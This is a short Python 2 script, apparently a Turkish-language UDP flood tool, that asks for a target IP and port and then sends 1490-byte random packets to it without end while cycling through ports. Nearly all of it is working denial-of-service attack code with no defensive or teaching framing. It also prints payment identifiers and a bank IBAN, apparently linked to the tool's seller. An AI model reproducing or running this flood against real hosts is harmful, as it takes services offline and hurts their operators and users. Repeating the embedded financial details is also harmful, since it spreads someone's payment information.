import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "    Shopier - 998bf4076dbe6c128d3e5bc6036faefe                " 
print "/chkiban 12c95cc6198d15b53e567b3f5fb025546"
print "   Registered - IBAN"
print "TR26 0004 6003 8188 8000 1223 39"

print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Yukleniyor"
time.sleep(5)
print "Yukleniyor. "
time.sleep(5)
print "Yukleniyor.. "
time.sleep(5)
print "Yukleniyor... "
time.sleep(5)
print "Yukleniyor.... "
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Gonderilen Paket Sayisi: %s , Gonderilen IP: %s , Gonderilen Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
